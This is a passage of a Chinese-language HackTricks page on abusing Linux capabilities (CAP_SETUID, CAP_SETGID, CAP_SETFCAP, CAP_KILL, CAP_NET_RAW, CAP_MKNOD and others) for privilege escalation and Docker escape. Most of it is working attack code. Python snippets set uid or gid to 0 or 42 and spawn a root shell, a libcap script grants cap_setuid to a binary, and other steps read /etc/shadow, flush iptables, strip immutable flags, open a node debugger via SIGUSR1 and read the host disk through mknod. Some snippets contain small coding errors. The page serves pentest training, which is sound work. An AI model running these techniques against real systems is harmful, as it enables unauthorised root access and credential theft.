<p>如果 python 拥有这个 <strong>capability</strong>，你可以很容易地利用它来提升权限到 root：</p>
<pre><code class="language-python">import os
os.setuid(0)
os.system("/bin/bash")
</code></pre>
<p><strong>另一种方法：</strong></p>
<pre><code class="language-python">import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
</code></pre>
<h2 id="cap_setgid"><a class="header" href="#cap_setgid">CAP_SETGID</a></h2>
<p><strong>这意味着可以设置创建进程的有效组 ID。</strong></p>
<p>有很多文件可以<strong>覆盖以提升权限，</strong> <a href="payloads-to-execute.html#overwriting-a-file-to-escalate-privileges"><strong>你可以从这里获取灵感</strong></a>。</p>
<p><strong>二进制文件示例</strong></p>
<p>在这种情况下，您应该寻找组可以读取的有趣文件，因为您可以冒充任何组：</p>
<pre><code class="language-bash">#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2&gt;/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2&gt;/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2&gt;/dev/null
</code></pre>
<p>一旦你找到一个可以利用的文件（通过读取或写入）来提升权限，你可以通过以下方式<strong>获取一个模拟有趣组的 shell</strong>：</p>
<pre><code class="language-python">import os
os.setgid(42)
os.system("/bin/bash")
</code></pre>
<p>在这种情况下，组 shadow 被冒充，因此您可以读取文件 <code>/etc/shadow</code>：</p>
<pre><code class="language-bash">cat /etc/shadow
</code></pre>
<p>如果 <strong>docker</strong> 已安装，您可以 <strong>冒充</strong> <strong>docker 组</strong> 并利用它与 <a href="./#writable-docker-socket"><strong>docker socket</strong> 进行通信并提升权限</a>。</p>
<h2 id="cap_setfcap"><a class="header" href="#cap_setfcap">CAP_SETFCAP</a></h2>
<p><strong>这意味着可以在文件和进程上设置能力</strong></p>
<p><strong>带二进制文件的示例</strong></p>
<p>如果 python 拥有此 <strong>能力</strong>，您可以非常轻松地利用它提升权限到 root：</p>
<p>{% code title="setcapability.py" %}</p>
<pre><code class="language-python">import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
</code></pre>
<p>{% endcode %}</p>
<pre><code class="language-bash">python setcapability.py /usr/bin/python2.7
</code></pre>
<p>{% hint style="warning" %}
注意，如果您使用 CAP_SETFCAP 为二进制文件设置了新的能力，您将失去此能力。
{% endhint %}</p>
<p>一旦您拥有 <a href="linux-capabilities.html#cap_setuid">SETUID capability</a>，您可以查看其部分以了解如何提升权限。</p>
<p><strong>环境示例（Docker 突破）</strong></p>
<p>默认情况下，能力 <strong>CAP_SETFCAP 被赋予 Docker 容器内的进程</strong>。您可以通过执行以下操作来检查：</p>
<pre><code class="language-bash">cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
</code></pre>
<p>这个能力允许<strong>将任何其他能力赋予二进制文件</strong>，因此我们可以考虑<strong>利用本页提到的其他能力突破</strong>来<strong>逃逸</strong>容器。<br />
然而，如果你尝试将能力 CAP_SYS_ADMIN 和 CAP_SYS_PTRACE 赋予 gdb 二进制文件，你会发现你可以赋予它们，但<strong>二进制文件在此之后将无法执行</strong>：</p>
<pre><code class="language-bash">getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
</code></pre>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">From the docs</a>: <em>Permitted: 这是一个<strong>有效能力的限制超集</strong>，线程可以假定它。它也是一个限制超集，线程可以将其<strong>不具有 CAP_SETPCAP</strong> 能力的可继承集合添加到其中。</em><br />
看起来 Permitted 能力限制了可以使用的能力。<br />
然而，Docker 默认也授予 <strong>CAP_SETPCAP</strong>，因此您可能能够<strong>在可继承的能力中设置新能力</strong>。<br />
然而，在此能力的文档中：<em>CAP_SETPCAP : […] <strong>将调用线程的边界</strong> 集中的任何能力添加到其可继承集合中。</em><br />
看起来我们只能将边界集合中的能力添加到可继承集合中。这意味着<strong>我们不能将新能力如 CAP_SYS_ADMIN 或 CAP_SYS_PTRACE 放入继承集合中以提升权限</strong>。</p>
<h2 id="cap_sys_rawio"><a class="header" href="#cap_sys_rawio">CAP_SYS_RAWIO</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_SYS_RAWIO</strong></a> 提供了一些敏感操作，包括访问 <code>/dev/mem</code>、<code>/dev/kmem</code> 或 <code>/proc/kcore</code>，修改 <code>mmap_min_addr</code>，访问 <code>ioperm(2)</code> 和 <code>iopl(2)</code> 系统调用，以及各种磁盘命令。<code>FIBMAP ioctl(2)</code> 也通过此能力启用，这在<a href="http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html">过去</a>造成了一些问题。根据手册页，这也允许持有者描述性地<code>对其他设备执行一系列特定于设备的操作</code>。</p>
<p>这对于<strong>权限提升</strong>和<strong>Docker 突破</strong>非常有用。</p>
<h2 id="cap_kill"><a class="header" href="#cap_kill">CAP_KILL</a></h2>
<p><strong>这意味着可以终止任何进程。</strong></p>
<p><strong>带有二进制文件的示例</strong></p>
<p>假设 <strong><code>python</code></strong> 二进制文件具有此能力。如果您还可以<strong>修改某些服务或套接字配置</strong>（或与服务相关的任何配置文件）文件，您可以对其进行后门处理，然后终止与该服务相关的进程，并等待新的配置文件执行您的后门。</p>
<pre><code class="language-python">#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
</code></pre>
<p><strong>使用 kill 进行权限提升</strong></p>
<p>如果你拥有 kill 权限，并且有一个 <strong>以 root 身份运行的 node 程序</strong>（或以其他用户身份运行），你可能可以 <strong>发送</strong> <strong>信号 SIGUSR1</strong> 给它，并使其 <strong>打开 node 调试器</strong>，以便你可以连接。</p>
<pre><code class="language-bash">kill -s SIGUSR1 &lt;nodejs-ps&gt;
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
</code></pre>
<p>{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
<a href="electron-cef-chromium-debugger-abuse.html">electron-cef-chromium-debugger-abuse.md</a>
{% endcontent-ref %}</p>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。这个大会的 <strong>使命是促进技术知识</strong>，是各个学科的技术和网络安全专业人士的热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="cap_net_bind_service"><a class="header" href="#cap_net_bind_service">CAP_NET_BIND_SERVICE</a></h2>
<p><strong>这意味着可以在任何端口上监听（甚至是特权端口）。</strong> 你不能直接通过这个能力提升特权。</p>
<p><strong>带有二进制文件的示例</strong></p>
<p>如果 <strong><code>python</code></strong> 拥有这个能力，它将能够在任何端口上监听，甚至可以从该端口连接到任何其他端口（某些服务需要从特定特权端口进行连接）</p>
<p>{% tabs %}
{% tab title="Listen" %}</p>
<pre><code class="language-python">import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="连接" %}</p>
<pre><code class="language-python">import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h2 id="cap_net_raw"><a class="header" href="#cap_net_raw">CAP_NET_RAW</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_NET_RAW</strong></a> 能力允许进程 <strong>创建 RAW 和 PACKET 套接字</strong>，使它们能够生成和发送任意网络数据包。这可能导致容器化环境中的安全风险，例如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在没有足够防火墙保护的情况下。此外，<strong>CAP_NET_RAW</strong> 对于特权容器支持通过 RAW ICMP 请求进行 ping 操作至关重要。</p>
<p><strong>这意味着可以嗅探流量。</strong> 你不能直接通过这个能力提升权限。</p>
<p><strong>带有二进制的示例</strong></p>
<p>如果二进制文件 <strong><code>tcpdump</code></strong> 拥有此能力，你将能够使用它捕获网络信息。</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
</code></pre>
<p>注意，如果<strong>环境</strong>赋予了这个能力，你也可以使用**<code>tcpdump</code>**来嗅探流量。</p>
<p><strong>示例与二进制 2</strong></p>
<p>以下示例是**<code>python2</code>**代码，可以用于拦截“<strong>lo</strong>”（<strong>localhost</strong>）接口的流量。该代码来自实验“<em>基础知识：CAP-NET_BIND + NET_RAW</em>” <a href="https://attackdefense.pentesteracademy.com">https://attackdefense.pentesteracademy.com/</a></p>
<pre><code class="language-python">import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value &amp; 1 &lt;&lt;i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] &amp; 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
</code></pre>
<h2 id="cap_net_admin--cap_net_raw"><a class="header" href="#cap_net_admin--cap_net_raw">CAP_NET_ADMIN + CAP_NET_RAW</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_NET_ADMIN</strong></a> 能力赋予持有者 <strong>更改网络配置</strong> 的权力，包括防火墙设置、路由表、套接字权限和暴露的网络命名空间中的网络接口设置。它还允许在网络接口上启用 <strong>混杂模式</strong>，允许跨命名空间进行数据包嗅探。</p>
<p><strong>带二进制文件的示例</strong></p>
<p>假设 <strong>python 二进制文件</strong> 拥有这些能力。</p>
<pre><code class="language-python">#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
</code></pre>
<h2 id="cap_linux_immutable"><a class="header" href="#cap_linux_immutable">CAP_LINUX_IMMUTABLE</a></h2>
<p><strong>这意味着可以修改 inode 属性。</strong> 你不能直接通过这个能力提升权限。</p>
<p><strong>带二进制的示例</strong></p>
<p>如果你发现一个文件是不可变的，并且 python 拥有这个能力，你可以 <strong>移除不可变属性并使文件可修改：</strong></p>
<pre><code class="language-python">#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
</code></pre>
<pre><code class="language-python">#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
</code></pre>
<p>{% hint style="info" %}
请注意，通常这个不可变属性是通过以下方式设置和移除的：</p>
<pre><code class="language-bash">sudo chattr +i file.txt
sudo chattr -i file.txt
</code></pre>
<p>{% endhint %}</p>
<h2 id="cap_sys_chroot"><a class="header" href="#cap_sys_chroot">CAP_SYS_CHROOT</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_SYS_CHROOT</strong></a> 使得可以执行 <code>chroot(2)</code> 系统调用，这可能通过已知漏洞允许从 <code>chroot(2)</code> 环境中逃逸：</p>
<ul>
<li><a href="https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf">如何从各种 chroot 解决方案中突破</a></li>
<li><a href="https://github.com/earthquake/chw00t/">chw00t: chroot 逃逸工具</a></li>
</ul>
<h2 id="cap_sys_boot"><a class="header" href="#cap_sys_boot">CAP_SYS_BOOT</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_SYS_BOOT</strong></a> 不仅允许执行 <code>reboot(2)</code> 系统调用以重启系统，包括针对特定硬件平台的特定命令如 <code>LINUX_REBOOT_CMD_RESTART2</code>，还允许使用 <code>kexec_load(2)</code>，并且从 Linux 3.17 开始，允许使用 <code>kexec_file_load(2)</code> 来加载新的或签名的崩溃内核。</p>
<h2 id="cap_syslog"><a class="header" href="#cap_syslog">CAP_SYSLOG</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_SYSLOG</strong></a> 在 Linux 2.6.37 中从更广泛的 <strong>CAP_SYS_ADMIN</strong> 中分离，专门授予使用 <code>syslog(2)</code> 调用的能力。此能力使得在 <code>kptr_restrict</code> 设置为 1 时，可以通过 <code>/proc</code> 和类似接口查看内核地址，该设置控制内核地址的暴露。自 Linux 2.6.39 起，<code>kptr_restrict</code> 的默认值为 0，这意味着内核地址被暴露，尽管许多发行版出于安全原因将其设置为 1（隐藏地址，除非来自 uid 0）或 2（始终隐藏地址）。</p>
<p>此外，<strong>CAP_SYSLOG</strong> 允许在 <code>dmesg_restrict</code> 设置为 1 时访问 <code>dmesg</code> 输出。尽管这些变化，<strong>CAP_SYS_ADMIN</strong> 仍然保留执行 <code>syslog</code> 操作的能力，因其历史原因。</p>
<h2 id="cap_mknod"><a class="header" href="#cap_mknod">CAP_MKNOD</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_MKNOD</strong></a> 扩展了 <code>mknod</code> 系统调用的功能，不仅限于创建常规文件、FIFO（命名管道）或 UNIX 域套接字。它特别允许创建特殊文件，包括：</p>
<ul>
<li><strong>S_IFCHR</strong>：字符特殊文件，如终端设备。</li>
<li><strong>S_IFBLK</strong>：块特殊文件，如磁盘设备。</li>
</ul>
<p>此能力对于需要创建设备文件的进程至关重要，便于通过字符或块设备直接与硬件交互。</p>
<p>这是一个默认的 docker 能力 (<a href="https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19">https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19</a>)。</p>
<p>此能力允许在主机上进行特权升级（通过完全磁盘读取），在以下条件下：</p>
<ol>
<li>拥有对主机的初始访问（无特权）。</li>
<li>拥有对容器的初始访问（特权（EUID 0），并有效 <code>CAP_MKNOD</code>）。</li>
<li>主机和容器应共享相同的用户命名空间。</li>
</ol>
<p><strong>在容器中创建和访问块设备的步骤：</strong></p>
<ol>
<li><strong>在主机上作为标准用户：</strong></li>
</ol>
<ul>
<li>使用 <code>id</code> 确定当前用户 ID，例如 <code>uid=1000(standarduser)</code>。</li>
<li>确定目标设备，例如 <code>/dev/sdb</code>。</li>
</ul>
<ol start="2">
<li><strong>在容器内作为 <code>root</code>：</strong></li>
</ol>
<pre><code class="language-bash"># Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
</code></pre>
<ol start="3">
<li><strong>回到主机：</strong></li>
</ol>
<pre><code class="language-bash"># Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
</code></pre>
<p>这种方法允许标准用户通过容器访问并可能读取来自 <code>/dev/sdb</code> 的数据，利用共享的用户命名空间和设备上设置的权限。</p>
<h3 id="cap_setpcap"><a class="header" href="#cap_setpcap">CAP_SETPCAP</a></h3>
<p><strong>CAP_SETPCAP</strong> 使进程能够 <strong>更改另一个进程的能力集</strong>，允许从有效、可继承和允许的集合中添加或删除能力。然而，进程只能修改其自身允许集中的能力，确保它无法将另一个进程的权限提升到超出自身的水平。最近的内核更新收紧了这些规则，限制 <code>CAP_SETPCAP</code> 只能减少其自身或其后代的允许集中的能力，以降低安全风险。使用时需要在有效集内拥有 <code>CAP_SETPCAP</code>，并在允许集中拥有目标能力，利用 <code>capset()</code> 进行修改。这总结了 <code>CAP_SETPCAP</code> 的核心功能和限制，突出了它在权限管理和安全增强中的作用。</p>
<p><strong><code>CAP_SETPCAP</code></strong> 是一种 Linux 能力，允许进程 <strong>修改另一个进程的能力集</strong>。它授予从其他进程的有效、可继承和允许能力集中添加或删除能力的能力。然而，对如何使用此能力有某些限制。</p>
<p>具有 <code>CAP_SETPCAP</code> 的进程 <strong>只能授予或移除其自身允许能力集中的能力</strong>。换句话说，如果进程自身没有该能力，则无法将其授予另一个进程。此限制防止进程将另一个进程的权限提升到超出自身的权限级别。</p>
<p>此外，在最近的内核版本中，<code>CAP_SETPCAP</code> 能力已被 <strong>进一步限制</strong>。它不再允许进程任意修改其他进程的能力集。相反，它 <strong>仅允许进程降低其自身允许能力集或其后代的允许能力集中的能力</strong>。此更改旨在减少与能力相关的潜在安全风险。</p>
<p>要有效使用 <code>CAP_SETPCAP</code>，您需要在有效能力集中拥有该能力，并在允许能力集中拥有目标能力。然后，您可以使用 <code>capset()</code> 系统调用来修改其他进程的能力集。</p>
<p>总之，<code>CAP_SETPCAP</code> 允许进程修改其他进程的能力集，但不能授予自身没有的能力。此外，由于安全问题，其功能在最近的内核版本中已被限制，仅允许减少其自身允许能力集或其后代的允许能力集中的能力。</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<p><strong>这些示例大多来自</strong> <a href="https://attackdefense.pentesteracademy.com"><strong>https://attackdefense.pentesteracademy.com/</strong></a>，因此如果您想练习这些权限提升技术，我推荐这些实验室。</p>
<p><strong>其他参考文献</strong>：</p>
<ul>
<li><a href="https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux">https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux</a></li>
<li><a href="https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/">https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.</a></li>
<li><a href="https://linux-audit.com/linux-capabilities-101/">https://linux-audit.com/linux-capabilities-101/</a></li>
<li><a href="https://www.linuxjournal.com/article/5737">https://www.linuxjournal.com/article/5737</a></li>
<li><a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module">https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module</a></li>
<li><a href="https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot">https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot</a></li>
</ul>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p><a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件之一，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../linux-hardening/privilege-escalation/linux-active-directory.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../linux-hardening/privilege-escalation/linux-active-directory.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
